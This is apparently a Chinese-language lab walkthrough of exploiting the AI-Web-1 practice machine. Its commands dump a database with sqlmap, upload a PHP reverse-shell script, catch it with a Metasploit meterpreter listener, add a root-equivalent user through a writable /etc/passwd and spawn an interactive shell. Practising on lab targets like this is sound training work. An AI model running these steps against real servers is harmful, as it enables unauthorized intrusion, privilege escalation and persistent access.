**前言**  

通过信息收集，收集网站可能存在的漏洞，然后进行漏洞复现，攻击外网服务器，从而获取外网服务器的权限，进而对服务器进行提权留后门等操作。

**漏洞利用**

Sqlmap -r/root/2.txt --dump -D aiweb1

**思路二：**

只利用kali进行  
php脚本反弹shell

  

![](../Images/1bcad037f56f4210af7cb6aae407d43f.png)

  

file-write 从本地写入，file-dest 写入目标路径（必须是dba权限）

  

![](../Images/24a3f13056f772b34aa50d1748f9a20a.png)

  

浏览上传php脚本的页面触发反弹shell

  

![](../Images/a0796e3a4ed4f0933edc26509b9ce9ad.png)

  

开启监听

`use exploit/multi/handler   set payload php/meterpreter/reverse_tcp   set lhost 10.10.10.129   set lport 8080   run`

![](../Images/e0e2ce518fc5f261315323ce46d3722b.png)

  

发现/etc/passwd这个目录是可读写的，openssl passwd创建一个web123用户并产生密文

  

![](../Images/0c753c5062884b8474760f61b4b2fece.png)

openssl passwd -1 -salt xxxxxxxx password  
Prints $1$xxxxxxxx$UYCIxa628.9qXjpQCjM4a.  
\-l：使用MD5加密  
\-salt：使用指定的盐。当读取来自终端的密码（web123）

  

![](../Images/42d25836093ad5d94e770c06dcf3adc4.png)

  

密文字符串格式为：$id$salt$encrypted，通过$来分割，其中$id用来指定使用的算法（这里是MD5算法，$id=1）

  

![](../Images/771cc5c830010593ee54cec26c748b1c.png)

  

![](../Images/e1420c4dd60970cbec1ecccea7f5c4ea.png)

  

当非交互式界面无法切换时  
python -c 'import pty;pty.spawn("/bin/bash")  
进入交互式界面切换用户  
切换root用户

  

![](../Images/853e8038848d5fbdc9fa7dce201f30ec.png)

  

**总结**

在做渗透测试的时候尽量能够获取webshell，如果获取不到webshell可以在有文件上传的地方上传反弹shell脚本；或者利用漏洞（系统漏洞，服务器漏洞，第三方软件漏洞数据库漏洞）来获取shell方便进行下一步的渗透测试。
